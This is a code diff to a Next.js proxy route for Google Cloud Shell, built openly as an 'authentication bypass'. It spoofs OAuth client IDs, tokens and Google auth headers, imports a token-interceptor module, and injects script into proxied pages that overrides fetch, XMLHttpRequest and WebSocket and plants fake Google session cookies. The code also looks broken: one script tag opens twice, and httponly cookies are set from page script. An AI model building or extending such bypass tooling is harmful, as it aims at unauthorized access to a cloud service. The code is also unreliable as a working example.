@@ -1,5 +1,8 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { getFakeAuthHeaders, createFakeCredentials } from '@/lib/auth/fake-auth';
+import { generateFakeClientId, getSpoofedOAuthHeaders, createFakeOAuthResponse } from '@/lib/auth/oauth-spoof';
+import { TOKEN_INTERCEPTOR_SCRIPT } from '@/lib/auth/token-interceptor';
+import { CLOUDSHELL_API_SCRIPT } from '@/lib/auth/cloudshell-api';
 
 /**
  * Full proxy that intercepts ALL requests to Google Cloud Shell
@@ -35,8 +38,28 @@ export async function GET(
       }
     }
 
-    // Fetch with comprehensive fake authentication
-    const authHeaders = getFakeAuthHeaders(fakeCreds);
+    // Generate fake OAuth Client ID
+    let fakeClientId = request.cookies.get('scg_fake_client_id')?.value;
+    if (!fakeClientId) {
+      fakeClientId = generateFakeClientId();
+    }
+
+    // Create OAuth response with fake client ID
+    const oauthResponse = createFakeOAuthResponse(fakeClientId);
+    
+    // Merge fake credentials with OAuth response
+    const enhancedCreds = {
+      ...fakeCreds,
+      access_token: oauthResponse.access_token,
+      refresh_token: oauthResponse.refresh_token,
+      client_id: fakeClientId,
+    };
+
+    // Fetch with comprehensive fake authentication including spoofed OAuth
+    const authHeaders = {
+      ...getFakeAuthHeaders(fakeCreds),
+      ...getSpoofedOAuthHeaders(fakeClientId, enhancedCreds.access_token),
+    };
     
     const response = await fetch(targetUrl, {
       method: 'GET',
@@ -60,16 +83,21 @@ export async function GET(
     if (contentType.includes('text/html') || contentType.includes('text/javascript') || contentType.includes('application/javascript')) {
       body = await response.text();
       
-      // Inject comprehensive authentication bypass
+      // Inject comprehensive authentication bypass with OAuth spoofing and token interception
       const bypassScript = `
+<script>
+${TOKEN_INTERCEPTOR_SCRIPT}
+${CLOUDSHELL_API_SCRIPT}
 <script>
 (function() {
   'use strict';
   
-  // Store fake credentials
-  const FAKE_TOKEN = '${fakeCreds.access_token}';
+  // Store fake credentials with OAuth Client ID
+  const FAKE_TOKEN = '${enhancedCreds.access_token}';
   const FAKE_EMAIL = '${fakeCreds.email}';
   const FAKE_USER_ID = '${fakeCreds.user_id}';
+  const FAKE_CLIENT_ID = '${fakeClientId}';
+  const FAKE_REFRESH_TOKEN = '${enhancedCreds.refresh_token}';
   
   // Set in all storage mechanisms
   try {
@@ -91,23 +119,25 @@ export async function GET(
   document.cookie = 'SID=fake-sid; path=/; domain=.google.com; secure; httponly';
   document.cookie = 'HSID=fake-hsid; path=/; domain=.google.com; secure; httponly';
   
-  // Override fetch completely
-  const originalFetch = window.fetch;
-  window.fetch = function(...args) {
-    const [url, options = {}] = args;
-    
-    // Add auth headers to all requests
-    options.headers = options.headers || {};
-    if (typeof options.headers === 'object' && !(options.headers instanceof Headers)) {
-      options.headers['Authorization'] = 'Bearer ' + FAKE_TOKEN;
-      options.headers['X-Goog-AuthUser'] = '0';
-      options.headers['X-Goog-Cloud-Shell-Auth'] = 'verified';
-      options.headers['X-Goog-User-Email'] = FAKE_EMAIL;
-      options.headers['X-Goog-User-Id'] = FAKE_USER_ID;
-    }
-    
-    return originalFetch.apply(this, [url, options]);
-  };
+          // Override fetch completely with OAuth Client ID spoofing
+          const originalFetch = window.fetch;
+          window.fetch = function(...args) {
+            const [url, options = {}] = args;
+            
+            // Add auth headers to all requests including OAuth Client ID
+            options.headers = options.headers || {};
+            if (typeof options.headers === 'object' && !(options.headers instanceof Headers)) {
+              options.headers['Authorization'] = 'Bearer ' + FAKE_TOKEN;
+              options.headers['X-Goog-AuthUser'] = '0';
+              options.headers['X-Goog-Cloud-Shell-Auth'] = 'verified';
+              options.headers['X-Goog-User-Email'] = FAKE_EMAIL;
+              options.headers['X-Goog-User-Id'] = FAKE_USER_ID;
+              options.headers['X-Goog-Client-Id'] = FAKE_CLIENT_ID;
+              options.headers['X-Goog-Request-Id'] = crypto.randomUUID?.() || Math.random().toString(36);
+            }
+            
+            return originalFetch.apply(this, [url, options]);
+          };
   
   // Override XMLHttpRequest completely
   const originalXHROpen = XMLHttpRequest.prototype.open;
@@ -127,16 +157,17 @@ export async function GET(
     return originalXHRSetHeader.apply(this, [name, value]);
   };
   
-  XMLHttpRequest.prototype.send = function(...args) {
-    // Auto-inject auth headers
-    this.setRequestHeader('Authorization', 'Bearer ' + FAKE_TOKEN);
-    this.setRequestHeader('X-Goog-AuthUser', '0');
-    this.setRequestHeader('X-Goog-Cloud-Shell-Auth', 'verified');
-    this.setRequestHeader('X-Goog-User-Email', FAKE_EMAIL);
-    this.setRequestHeader('X-Goog-User-Id', FAKE_USER_ID);
-    
-    return originalXHRSend.apply(this, args);
-  };
+          XMLHttpRequest.prototype.send = function(...args) {
+            // Auto-inject auth headers with OAuth Client ID
+            this.setRequestHeader('Authorization', 'Bearer ' + FAKE_TOKEN);
+            this.setRequestHeader('X-Goog-AuthUser', '0');
+            this.setRequestHeader('X-Goog-Cloud-Shell-Auth', 'verified');
+            this.setRequestHeader('X-Goog-User-Email', FAKE_EMAIL);
+            this.setRequestHeader('X-Goog-User-Id', FAKE_USER_ID);
+            this.setRequestHeader('X-Goog-Client-Id', FAKE_CLIENT_ID);
+            
+            return originalXHRSend.apply(this, args);
+          };
   
   // Override WebSocket to inject auth
   const originalWebSocket = window.WebSocket;
@@ -224,7 +255,15 @@ export async function GET(
     });
 
     // Store credentials in cookie for future requests
-    modifiedResponse.cookies.set('scg_fake_creds', JSON.stringify(fakeCreds), {
+    modifiedResponse.cookies.set('scg_fake_creds', JSON.stringify(enhancedCreds), {
+      httpOnly: false,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'lax',
+      maxAge: 7 * 24 * 60 * 60,
+    });
+    
+    // Store fake OAuth Client ID
+    modifiedResponse.cookies.set('scg_fake_client_id', fakeClientId, {
       httpOnly: false,
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'lax',
